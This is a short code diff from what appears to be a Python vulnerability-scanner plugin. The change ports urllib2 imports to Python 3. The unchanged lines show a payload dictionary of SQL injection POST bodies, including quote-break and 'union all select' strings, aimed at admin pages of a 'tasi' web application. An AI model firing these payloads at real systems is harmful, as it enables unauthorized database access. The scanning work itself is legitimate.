@@ -10,7 +10,7 @@ def assign(service, arg):
 
 
 def audit(arg):
-    import urllib2
+    import urllib.request, urllib.error, urllib.parse
     payloads = {'tasi/admin/system/tutordept.asp':'txtDeptName=aaa%27&did=0&action=add&page=0&btnNewSaveDept=%B1%A3%B4%E6',\
     'tasi/admin/system/language.asp':'editLangCode=-1%27%20union%20all%20select%201%20--&editLangName=SS&langid=&action=add&btnSaveLang=%B1%A3%B4%E6',\
     'tasi/admin/system/subject.asp':'editSClassCode=01&editSClassName=%D5%DC%D1%A7%27&dtype=1&scid=1&type=modify&btnSaveSClass=%B1%A3%B4%E6',\
